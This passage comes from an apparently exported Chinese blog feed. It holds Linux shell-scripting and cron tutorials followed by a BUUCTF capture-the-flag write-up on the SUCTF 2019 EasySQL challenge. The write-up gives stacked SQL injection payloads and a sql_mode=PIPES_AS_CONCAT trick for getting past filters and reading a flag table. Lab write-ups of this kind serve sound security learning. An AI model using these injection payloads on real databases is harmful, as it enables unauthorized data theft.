可用的整数比较运算符</p><table><thead><tr><th>操作符</th><th>作用</th></tr></thead><tbody><tr><td>-eq</td><td>是否等于</td></tr><tr><td>-ne</td><td>是否不等于</td></tr><tr><td>-gt</td><td>是否大于</td></tr><tr><td>-lt</td><td>是否小于</td></tr><tr><td>-le</td><td>是否等于或小于</td></tr><tr><td>-ge</td><td>是否大于或等于</td></tr></tbody></table><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203222106004.png"></p><p>free命令可以用来获取当前系统正在使用及可以使用的内存量信息,先使用free -m命令查看内存使用量情况 ,然后通过 grep men 命令过出剩余内存量的行,在用awk ‘{print $4}’命令值保留第四列</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203222112003.png" alt="image-20220322211215956"></p><p>如果想把这个命令写入到shell脚本中,那么建议把输出结果赋值给一个变量,以方便其他命令进行调用</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203222114385.png" alt="image-20220322211425345"></p><p>上面用于获取内存可用量的命令,接下来我们使用整数运算符来判断内存可用量的值是否小于1024,若小于则会提示 lnsufficient Memory (内存不足) 的字样</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203222117919.png" alt="image-20220322211734881"></p><p>字符串比较语句用来判断测试字符串是否为空值,或者两个字符串是否相同, 它通常用来判断某个变量是否被定义(即内容为空值)</p><p>  常见的字符串比较运算符</p><table><thead><tr><th>操作符</th><th>作用</th></tr></thead><tbody><tr><td>&#x3D;</td><td>比较字符串内容是否相同</td></tr><tr><td>!&#x3D;</td><td>比较字符串内容是否不同</td></tr><tr><td>-z</td><td>判断字符串内容是否为空</td></tr></tbody></table><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203222119391.png" alt="image-20220322211927354"></p><p>当用于保存当前语系的环境变量值LANG不是英语时,则会满足逻辑测试条件并输出</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203222121853.png" alt="image-20220322212138817"></p><h3 id="流程控制语句"><a href="#流程控制语句" class="headerlink" title="流程控制语句"></a>流程控制语句</h3><h4 id="if条件测试语句"><a href="#if条件测试语句" class="headerlink" title="if条件测试语句"></a>if条件测试语句</h4><p>if条件测试语句可以让脚本根据实际情况自动执行相应的命令,if条件测试语句的单分支结构由if then fi关键词组成,而且只在条件成立后才执行预设的命令</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203222124581.png" alt="image-20220322212455541"></p><p>下面使用单分支的if条件语句俩判断&#x2F;media&#x2F;cdrom目录是否存在,若不存在就创建这个目录,反之则结束条件判断和整个shell脚本的执行</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203222127157.png" alt="image-20220322212746118"></p><p>这里使用bash脚本名称的方式来执行脚本,在正常情况下顺利执行完脚本文件没有任何输出信息,但是可以使用ls命令验证&#x2F;media&#x2F;cdrom目录是否创建成功</p><p>下面使用双分支的if语句来验证某台主机是否在线,然后根据返回值的结果,要么显示主机在线,要么显示主句不在线信息.这里的脚本主要使用ping命令来测试与对方主机的网络连通性,而linux系统中的ping命令栏不像windows一样尝试四次就结束,因此为了避免用户等待时间过长,需要通过-c参数来规定尝试的次数,并使用-i参数定义每个数据包的发送间隔,以及使用-W参数定义等待超过时间</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231117579.png" alt="image-20220323111708471"></p><p>$? 的作用是显示上一次命令的执行返回值.若前面那条语句执行成功,则$?变量会显示数字0 反之则显示一个非零的数字.一次可以用整数比较运算符来判断$?变量是否为0 从而获知那条语句的最终判断情况</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231247737.png" alt="image-20220323124721697"></p><p>if条件语句的多分支结构由if then else fi 关键词组成,它进行多次条件判断,这多次判断中的任何一项在匹配成功后都会执行相应预设的命令,相当于口语的如果 那么 如果那么.</p><p>在linux系统中,read是用来读取用户输入信息的命令,能够把接受到的用户输入信息赋给后面的指定变量,-p参数用于向用户显示一些提示信息</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231249225.png" alt="image-20220323124926187"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231253070.png" alt="image-20220323125337033"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231254628.png" alt="image-20220323125428594"></p><h4 id="for条件循环语句"><a href="#for条件循环语句" class="headerlink" title="for条件循环语句"></a>for条件循环语句</h4><p>for循环语句允许脚本一次性读取多个信息,然后逐一对信息进行操作处理,当要处理的数据有范围时,使用for循环语句就在合适不过</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231256993.png" alt="image-20220323125622957"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231256714.png" alt="image-20220323125643672"></p><p>&#x2F;dev&#x2F;null是一个被称为linux黑洞的文件,把输入信息重定向到这个文件等同于删除数据,类似于没有回收功能的垃圾箱,可以让用户的屏幕保持整洁</p><p>执行批量创建用户的Shell脚本addusers.sh，在输入为账户设定的密码后将由脚本自动检查并创建这些账户。由于已经将多余的信息通过输出重定向符转移到了&#x2F;dev&#x2F;null黑洞文件中，因此在正常情况下屏幕窗口除了“用户账户创建成功”（Create success）的提示后不会有其他内容。</p><p>在Linux系统中，&#x2F;etc&#x2F;passwd是用来保存用户账户信息的文件。如果想确认这个脚本是否成功创建了用户账户，可以打开这个文件，看其中是否有这些新创建的用户信息。</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231259528.png" alt="image-20220323125901488"></p><h4 id="while条件循环语句"><a href="#while条件循环语句" class="headerlink" title="while条件循环语句"></a>while条件循环语句</h4><p>while条件循环语句是一种让脚本根据某些条件来重复执行命令的语句,他的循环结果往往在执行前不确定最终执行的次数,完全不同于for循环中有目标有范围的使用场景.</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231301163.png" alt="image-20220323130101126"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231302880.png" alt="image-20220323130237839"></p><h4 id="case条件测试语句"><a href="#case条件测试语句" class="headerlink" title="case条件测试语句"></a>case条件测试语句</h4><p>case条件测试语句和switch语句的功能非常相似！case语句是在多个范围内匹配数据，若匹配成功则执行相关命令并结束整个条件测试；如果数据不在所列出的范围内，则会去执行星号（*）中所定义的默认命令。</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231302033.png" alt="image-20220323130227986"></p><h3 id="计划任务服务程序"><a href="#计划任务服务程序" class="headerlink" title="计划任务服务程序"></a>计划任务服务程序</h3><p>计划任务分为一次性计划任务与长期性计划任务</p><ul><li>一次性计划任务:今晚23:30重启网站服务</li><li>长期性计划任务:每周一的凌晨3:25把&#x2F;home&#x2F;wwwroot目录打包备份到backup.tar.gz</li></ul><p>顾名思义,一次性计划任务只执行一次,一般用于临时的工作需求.可以使用at命令实现这种功能,只需要写成 at 时间 的形式就行.如果想要查看已经设置好的但未执行的一次性计划任务,可以使用at -l 命令;要想将其删除,可以使用 “atrm任务序号” </p><p> at命令的参数及其作用</p><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>-f</td><td>指定包含命令的任务文件</td></tr><tr><td>-q</td><td>指定新任务名称</td></tr><tr><td>-l</td><td>显示待执行任务列表</td></tr><tr><td>-d</td><td>删除指定待执行任务</td></tr><tr><td>-m</td><td>任务执行后给用户发邮件</td></tr></tbody></table><p>在使用at命令来设置一次性计划任务时默认采用的是交互式方法.</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231309945.png" alt="image-20220323130900907"></p><p>在输入完成systemctl restart httpd之后按下ctrl 加上 d来结束编写计划任务</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231310030.png" alt="image-20220323131012997"></p><p>也可以使用管道符达到非交互式的方式创建计划一次性任务的目的</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231335365.png" alt="image-20220323133521329"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231341301.png" alt="image-20220323134108264"></p><p>可以使用atrm命令轻松删除其中一条</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231341729.png" alt="image-20220323134152695"></p><p>这里还有一种特殊场景把一计划任务写入到shell脚本中,当用户激活该脚本后再开始倒计时执行,而不是像上面那样在固定的时间进行</p><p>一般会使用at now +2 MINUTE 的方式进行操作,这表示2分钟(MINUTE)后执行这个任务,也可以将其代替为小时(HOUR) 日(DAY) 月(MONTH)</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231343800.png" alt="image-20220323134306764"></p><p>还有些时候,我们希望linux系统能都周期性的有规律的执行某些具体的任务,那么linux系统中默认弃用crond服务简直在合适不过.创建编辑计划任务的命令时crontab -e,查看当前计划任务的命令为crontab -l,删除某条计划任务的命令为crontab -r.另外如果是管理员身份登录,可以在crontab命令中加上-u 参数来编辑他人的计划任务.</p><p>crontab命令中的参数及其作用</p><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>-e</td><td>编辑计划任务</td></tr><tr><td>-u</td><td>指定用户名称</td></tr><tr><td>-l</td><td>列出任务列表</td></tr><tr><td>-r</td><td>删除计划任务</td></tr></tbody></table><p>分 时 日 月 星期 命令,这是使用crond服务设置任务的参数格式,如果有些字段没有被设置,则需要使用星号(*)占位</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231348532.png" alt="image-20220323134842478"></p><p>  使用crond设置任务的参数字段说明</p><table><thead><tr><th>字段</th><th>说明</th></tr></thead><tbody><tr><td>分钟</td><td>取值为0～59的整数</td></tr><tr><td>小时</td><td>取值为0～23的任意整数</td></tr><tr><td>日期</td><td>取值为1～31的任意整数</td></tr><tr><td>月份</td><td>取值为1～12的任意整数</td></tr><tr><td>星期</td><td>取值为0～7的任意整数，其中0与7均为星期日</td></tr><tr><td>命令</td><td>要执行的命令或程序脚本</td></tr></tbody></table><p>假设在每周一 三 五的凌晨3:25,都需要使用tar命令把某个网站的数据目录进行打包处理,使其作为一个备份文件.我们可以使用crontab -e命令来创建计划任务,为自己创建计划任务时无需使用-u参数.crontab -e命令的具体实现效果和crontab -l命令的结果</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231352690.png" alt="image-20220323135225649"></p><p>除了使用逗号(,)来分别表示多个时间段,例如”8,9,12”表示8月,9月,12月.还可以使用减号(-)来表示一段连续的时间周期,(例如字段”日”的取值为”12-15”,则表示每月的12-15日).还可以用除号(&#x2F;)表示执行任务的间隔时间(例如”*&#x2F;2”表示没间隔两分钟执行一次任务)</p><p>如果在crond服务中需要同时包含多条计划任务的命令语句,应该每行仅写一条.例如我们在添加一条计划任务,它的功能是每周一至周五的凌晨一点自动清空&#x2F;tmp目录中的所有文件.尤其需要注意的是,在crond服务的计划任务参数中,所有命令一定要用绝对路径的方式来写,如果不知道绝对路径,请用whereis命令来进行查询.rm命令的路径为下面输出信息中的加粗部分</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231359170.png" alt="image-20220323135959125"></p><ul><li>在crond服务的配置参数中,一般会像shell脚本那样以#号开头写上注释信息,这样在日后回顾这段命令代码时可以快速了解其功能需求以及编写人员等重要信息.</li><li>计划任务中的”分”字段必须有数值,绝对不能为空或者是(*)号,而”日”和”星期”字段不能同时使用,否则就会发生冲突</li></ul><p>删除crond计划任务使用crondtab -e命令进入编辑界面,删除里面的文本信息即可.也可以使用crondtab -r命令直接进行删除</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231404545.png" alt="image-20220323140419505"></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux学习(二)</title>
      <link href="/Linux/Linux/Linux-linux%E6%93%8D%E4%BD%9C%E5%AD%A6%E4%B9%A0(%E4%BA%8C)/"/>
      <url>/Linux/Linux/Linux-linux%E6%93%8D%E4%BD%9C%E5%AD%A6%E4%B9%A0(%E4%BA%8C)/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux学习-二"><a href="#Linux学习-二" class="headerlink" title="Linux学习(二)"></a>Linux学习(二)</h1><h2 id="管道符-重定向与环境变量"><a href="#管道符-重定向与环境变量" class="headerlink" title="管道符 重定向与环境变量"></a>管道符 重定向与环境变量</h2><h3 id="输入输出重定向"><a href="#输入输出重定向" class="headerlink" title="输入输出重定向"></a>输入输出重定向</h3><ul><li>标准输入重定向(STDIN,文件描述符为0):默认从键盘输入,也可以从其他文件或命令中输入</li><li>标准输出重定向(STDOUT,文件描述符为1):默认输出到屏幕</li><li>错误输出重定向(STDERR,文件描述符为2):默认输出到屏幕</li></ul><p>比如分别查看两个文件的属性信息,我们先创建第一个文件,而第二个文件是不存在的.所以针对这两个文件的操作都分别会在屏幕上输出一些信息</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203211512809.png" alt="image-20220321151203749"></p><p>上述命令中,名为1的文件是真实存在的,输出信息是该文件的相关权限 所有者 文件大小 及修改时间等信息 这也是该命令的标准输出信息 而名为xxxx 的文件本来是不存在的,因此在执行完该ls 命令之后显示的报错信息也是该命令的错误输出信息.那么想要把原本输出到屏幕上的数据转而写入文件中,就需要区别对待这两种输出信息</p><p> 输入重定向中用到的符号及其作用</p><table><thead><tr><th>符号</th><th>作用</th></tr></thead><tbody><tr><td>命令 &lt; 文件</td><td>将文件作为命令的标准输入</td></tr><tr><td>命令 &lt;&lt; 分界符</td><td>从标准输入中读入，直到遇见分界符才停止</td></tr><tr><td>命令 &lt; 文件1 &gt; 文件2</td><td>将文件1作为命令的标准输入并将标准输出到文件2</td></tr></tbody></table><p> 输出重定向中用到的符号及其作用</p><table><thead><tr><th>符号</th><th>作用</th></tr></thead><tbody><tr><td>命令 &gt; 文件</td><td>将标准输出重定向到一个文件中（清空原有文件的数据）</td></tr><tr><td>命令 2&gt; 文件</td><td>将错误输出重定向到一个文件中（清空原有文件的数据）</td></tr><tr><td>命令 &gt;&gt; 文件</td><td>将标准输出重定向到一个文件中（追加到原有内容的后面）</td></tr><tr><td>命令 2&gt;&gt; 文件</td><td>将错误输出重定向到一个文件中（追加到原有内容的后面）</td></tr><tr><td>命令 &gt;&gt; 文件 2&gt;&amp;1   或  命令 &amp;&gt;&gt; 文件</td><td>将标准输出与错误输出共同写入到文件中（追加到原有内容的后面）</td></tr></tbody></table><p>对于重定向中的标准输出模式,可以省略文件描述符1 不写,而错误输出模式的文件描述2是必须要写的 .通过标准输出重定向将 man bash命令原本要输出到屏幕的信息写入到文件readme.txt中,然后显示该文件中的内容</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203211519188.png" alt="image-20220321151943105"></p><p>接下来将使用覆盖写入与追加写入这两种不同的模式带来的变化 首先通过覆盖写入模式像readme.txt文件写入多行数据,这个命令只会剩下最后一次的</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241309078.png" alt="image-20220321152327141"></p><p>使用追加的方式向readme.txt文件写入一次数据,然后执行</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203211645801.png" alt="image-20220321164528752"></p><p>虽然都是重定向,但是命令的标准输出和错误输出还是有区别的.</p><p>将错误的信息输出到文件中去</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203211650806.png" alt="image-20220321165050759"></p><p>还有就是不区分标准输出和错误输出,只要命令有输出信息就追加写入到文件中.这就要用到&amp;&gt;&gt;操作符了</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203211658770.png" alt="image-20220321165844731"></p><p>输出重定向的作用就是把文件直接导入到命令中 接下来使用输出重定向把readme.txt文件导入给wc -l命令,统计一下文件中的内容行数</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203211700527.png" alt="image-20220321170039490"></p><h3 id="管道命令符"><a href="#管道命令符" class="headerlink" title="管道命令符"></a>管道命令符</h3><p>管道命令符的作用也可以概括为一句话 把前一个命令原本要输出到屏幕的信息当做后一个命令的标准输入,我们通过匹配关键字&#x2F;sbin.nologin找出了所有被限制登录系统的用户</p><ul><li>找出被限制登录的名称是grep &#x2F;sbin&#x2F;nologin &#x2F;etc&#x2F;passwd</li><li>统计文本函数的命令时wc -l</li></ul><p>现在需要做的是把grep搜索命令的输出值传递给wc统计命令,即把原本要输出到屏幕的用户信息列表在交给wc命令做进一步的加工,因此只需要把管道符放到两条语句之间即可</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203211706811.png" alt="image-20220321170638770"></p><p>比如用翻页的模式查看&#x2F;etc目录中的文件列表及属性信息</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203211708008.png" alt="image-20220321170817968"></p><p>在修改用户密码时,通常需要输入两次密码以进行确认,这在编写自动化脚本的时候将成为一个非常致命的缺陷,通常把管道符和passwd命令的–stdin参数相结合,可以使用一条命令来完成密码重置操作</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203211710988.png" alt="image-20220321171033943"></p><p>在输入ps aux命令后屏幕上的信息呼呼闪过,看不到有用信息,现在可以将ps grep 管道符 三者结合到一起使用了 下面搜索与bash 有关的进程信息</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203211712433.png" alt="image-20220321171257391"></p><p>如果需要将管道符处理后的结果既要输出到屏幕,又同时写入到文件中,则可以与tee命令相结合使用</p><p>下面的命令将显示系统中所有与bash相关的进程信息,并同时将输出到屏幕和文件中</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203211715506.png" alt="image-20220321171555470"></p><h3 id="命令行的统配符"><a href="#命令行的统配符" class="headerlink" title="命令行的统配符"></a>命令行的统配符</h3><p>比如,我们想要批量查看所有硬盘文件的相关权限属性.这些硬盘设备文件都是以sda开头并且存放到了&#x2F;dev目录中，这样一来，即使不知道硬盘的分区编号和具体分区的个数，也可以使用通配符来搞定</p><p>通配符就是通用的匹配信息的符号,比如星号*代表匹配零个或者多个符号,问号?表示匹配单个字符,中括号内加上数字[0-9]表示匹配0-9之间的单个数字的字符,而中括号内加上字母[abc]则是表示匹配abc三个字符中的任意一个字符</p><p> Linux系统中的通配符及含义</p><table><thead><tr><th>通配符</th><th>含义</th></tr></thead><tbody><tr><td>*</td><td>任意字符</td></tr><tr><td>?</td><td>单个任意字符</td></tr><tr><td>[a-z]</td><td>单个小写字母</td></tr><tr><td>[A-Z]</td><td>单个大写字母</td></tr><tr><td>[a-Z]</td><td>单个字母</td></tr><tr><td>[0-9]</td><td>单个数字</td></tr><tr><td>[[:alpha:]]</td><td>任意字母</td></tr><tr><td>[[:upper:]]</td><td>任意大写字母</td></tr><tr><td>[[:lower:]]</td><td>任意小写字母</td></tr><tr><td>[[:digit:]]</td><td>所有数字</td></tr><tr><td>[[:alnum:]]</td><td>任意字母加数字</td></tr><tr><td>[[:punct:]]</td><td>标点符号</td></tr></tbody></table><p>匹配所有在&#x2F;dev目录中且以sda开头的文件</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203211721688.png" alt="image-20220321172103645"></p><p>如果只是想查看文件名以sda开头,但是后面还仅跟着其他某一个字符的文件的相关信息,这时就需要用到问号来进行统配了</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203211723768.png" alt="image-20220321172316728"></p><p>除了使用[0-9]来匹配0-9之间的单个数字,也可以使用[125]这样的方式仅匹配3个指定数字中的一个;若没有匹配出来就不会显现出来</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203211725294.png" alt="image-20220321172516258"></p><p>通配符不一定非要放到最后,也可以放到前面,比如可以使用以下的命令来搜索&#x2F;etc&#x2F;目录中所有以.config为结尾的配置文件有哪些</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203211726835.png" alt="image-20220321172641793"></p><p>通配符不仅可以用于搜索文件或者代替通配符的字符,还可以与创建文件命令相结合,一口气创建出多个文件.不过在创建文件的时候,需要使用大括号,并且字段之间用逗号隔开</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203211729694.png" alt="image-20220321172901655"></p><p>通配符还可以输出指定的信息</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203211729022.png" alt="image-20220321172958974"></p><h3 id="常用的转义字符"><a href="#常用的转义字符" class="headerlink" title="常用的转义字符"></a>常用的转义字符</h3><p>常用的转义字符</p><ul><li>反斜杠(\) :使反斜杠后面的一个变量变为单纯的字符</li><li>单引号(‘’):转义其中所有的变量为单纯的字符串</li><li>双引号(“”):保留其中的变量属性,不进行转义处理</li><li>反引号(&#96;&#96;):把其中的命令执行后返回结果</li></ul><p>我们先定义一个名为PRICE的变量并赋值为5,然后输出以双引号括起来的字符串与变量信息</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221809595.png" alt="image-20220322180856525"></p><p>我们接下来希望能输出”Price is $5”,即”价格是5美元”的字符串内容,但碰巧美元符号与变量提取符号合并之后的$$作用是显示当前程序的进程ID号码,于是命令执行后的输出的内容弄并不是我们所预期的</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221813762.png" alt="image-20220322181355715"></p><p>想要第一个$称为美元复发,那么需要使用反斜杠(\)来进行转义,将这个命令提取符转义成单纯的文本</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221815759.png" alt="image-20220322181515717"></p><p>而如果只需要某个命令的输出值,可以像&#96;&#96;命令一样,将命令用反引号括起来,达到预期的效果.例如,将反引号与uname -a命令结合,然后使用echo命令来查看本机的linux版本和内核信息.</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221817665.png" alt="image-20220322181724621"></p><p>反斜杠胡反引号的功能比较有特点</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221820011.png" alt="image-20220322182000968"></p><p>两者的区别在与用户无法得知第一种执行方式中到底有几个参数,因为有可能把”AA BB CC”当成一个参数整体输出到屏幕上,也有可能将AA BB CC分别输出到屏幕上</p><p>如果参数中出现了空格,就加上单引号,如果参数中没有空格,那么就不用加双引号</p><h3 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h3><p>变量是计算机系统用于保存可变值的数据类型,在linux系统中,变量名称一般都是大写的,命令则都是小写的,这是一种规范.linux中的环境变量是用来定义系统运行环境的一些参数,比如每个用户不同的家目录,邮件存在的位置等.可以直接通过变量的名称来提取对应的变量值.</p><p>linux中命令在执行时分为四个步骤</p><ol><li><p>判断用户是否以绝对路径或相对路径的方式输入命令(如&#x2F;bin&#x2F;ls),如果是绝对路径则直接执行,否则进入第二步继续判断</p></li><li><p>linux系统检查用户输入的命令是否为”别名命令”,即一个自定义的命令名称来提换原本的命令名称之前在使用rm命令删除文件时,linux系统都会要求用户确认是否执行删除操作,其实这就是linux系统为了防止用户误删除文件而特意设置的rm别名命令 “rm -i”<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221830123.png" alt="image-20220322183042074">可以使用alias命令来创建一个属于自己的命令别名,语法格式为”alias别名&#x3D;命令” 若要取消一个命令的别名,则是用unalias命令,语法</p><pre><code>unalias 别名</code></pre></li><li><p>Bash解释器判断用户输入的是内部命令还是外部命令.内部命令时解释器内部的指令,会被直接执行;而用户在绝大部分时间输入的是外部命令,这些命令交由步骤4继续处理.可以使用”type命令名称”来判断用户输入的命令时内部命令还是外部命令<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221836524.png" alt="image-20220322183641480"></p></li><li><p>系统在多个路径中查找用户输入的命令文件,而定义这些路径的变量叫做PATH,可以简单的把他理解成是”解释器的小助手”.所用是告诉Bash解释器待执行的命令可能存放的位置,然后bash解释器就会乖乖的在这些位置直接查找.PATH是由多个路径值组成的变量,每个路径之间用冒号间隔,对这些路径的增加或者删除操作都将影响到bash解释器对linux命令的查找</p></li></ol><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241309080.png" alt="image-20220322184106239"></p><p>为什么不能将当前目录(.)添加到PATH中呢?原因是黑客在比较常用的公共目录&#x2F;tmp中存放了一个与ls或者cd命令同名的木马文件,只要在这里执行了就会中招</p><p>在接手一台linux系统之后一定会在执行命令前先检查PATH变量中是否有可疑的目录,我们可以使用env命令来查看linux系统中所有的环境变量</p><p> Linux系统中最重要的10个环境变量</p><table><thead><tr><th>变量名称</th><th>作用</th></tr></thead><tbody><tr><td>HOME</td><td>用户的主目录（即家目录）</td></tr><tr><td>SHELL</td><td>用户在使用的Shell解释器名称</td></tr><tr><td>HISTSIZE</td><td>输出的历史命令记录条数</td></tr><tr><td>HISTFILESIZE</td><td>保存的历史命令记录条数</td></tr><tr><td>MAIL</td><td>邮件保存路径</td></tr><tr><td>LANG</td><td>系统语言、语系名称</td></tr><tr><td>RANDOM</td><td>生成一个随机数字</td></tr><tr><td>PS1</td><td>Bash解释器的提示符</td></tr><tr><td>PATH</td><td>定义解释器搜索用户执行命令的路径</td></tr><tr><td>EDITOR</td><td>用户默认的文本编辑器</td></tr></tbody></table><p>linux作为一个多用户 多任务的操作系统,能够为每个用户提供独立的 合适的工作运行环境,因此一个相同的变量会因为用户身份的不同而具有不同的值.例如使用下述命令来查看HOME变量在不同的用户身份下都有哪些值</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221847704.png" alt="image-20220322184749657"></p><p>直接在终端设置的变量能够立即生效,但是重启服务器之后就会立即失效,因此我们需要将变量和变量值写入到.bashrc或者.bash_profile中,以确保永久能使用他们.</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF的web(一)</title>
      <link href="/BUUCTF/BUUCTF/BUUCTF-web(%E4%B8%80)/"/>
      <url>/BUUCTF/BUUCTF/BUUCTF-web(%E4%B8%80)/</url>
      
        <content type="html"><![CDATA[<h1 id="堆叠注入-绕过-限制"><a href="#堆叠注入-绕过-限制" class="headerlink" title="堆叠注入,绕过||限制"></a>堆叠注入,绕过||限制</h1><p><a href="https://buuoj.cn/challenges#[SUCTF%202019]EasySQL">BUUCTF的suctf2019,EasySQL</a></p><p>闭合测试</p><pre><code>query=1</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221108310.png" alt="image-20220322110813199"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221108116.png" alt="image-20220322110824045"></p><p>这里输入’没有回显也没有报错</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221108356.png" alt="image-20220322110852300"></p><p>这里发现有过滤,本来想fuzz的发现平台靶机不让扫手工测试吧</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221109941.png" alt="image-20220322110946880"></p><p>发现过滤了union,那么联合注入肯定就不行了.</p><p>尝试一下堆叠注入,发现回显了数据库</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221111781.png" alt="image-20220322111100711"></p><p>接着查一下表</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221111362.png" alt="image-20220322111124297"></p><p>但是查字段的时候发现了问题,这里发现from 和 flag 都被过滤了,这怎么注入</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221112015.png" alt="image-20220322111226954"></p><p>这块需要我们对后端的语句进行猜测,通过输入非零数字得到回显和输入其他字符得不到回显来判断出内部的查询语句可能存在有|| ,也就是select 输入的数据|| 内置一个列名 from 表名,进一步猜测即为select post 进去的数据 || flag from flag (含有数据的表名,通过堆叠注入可知),需要注意的是,此时的|| 起到的作用是or 的作用</p><p><strong>方法一</strong></p><pre><code>输入的内容为 *,1 内置的sql语句为sql = &quot;select&quot;.sql = &quot;select&quot;.post[&#39;query&#39;].&quot;||flag from flag&quot;;那么最终语句就是 &quot;select *,1 || flag from flag&quot;也就是select *,1 from flag;也就直接查出来flag表中的所有数据</code></pre><p><strong>方法二</strong></p><pre><code>输入内容为1; set sql_mode=pipes_as_concat;select 1其中set sql_mode=pipes_as_concat的作用是将||的作用由or变为拼接字符串</code></pre><p>查询当前数据库的sql_mode</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221227328.png" alt="image-20220322122725261"></p><p> 这个sql_mode下使用||异或运算符</p><pre><code>select 0 || flag from flag;</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221227813.png" alt="image-20220322122742757"></p><p>当设置sql_mode为PIPES_AS_CONCAT时，将”||”视为字符串的连接操作符而非或运算符，这和Oracle数据库是一样的，也和字符串的拼接函数Concat相类似</p><pre><code>set sql_mode=PIPES_AS_CONCAT;</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221228710.png" alt="image-20220322122824640"></p><pre><code>select 1 || flag from flag;</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221228397.png" alt="image-20220322122844336"></p><pre><code>sql=&quot;select&quot;.sql=&quot;select&quot;.post[‘query’].&quot;||flag from Flag&quot;;query=3;set sql_mode=PIPES_AS_CONCAT;select 3</code></pre><p><strong><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221230905.png" 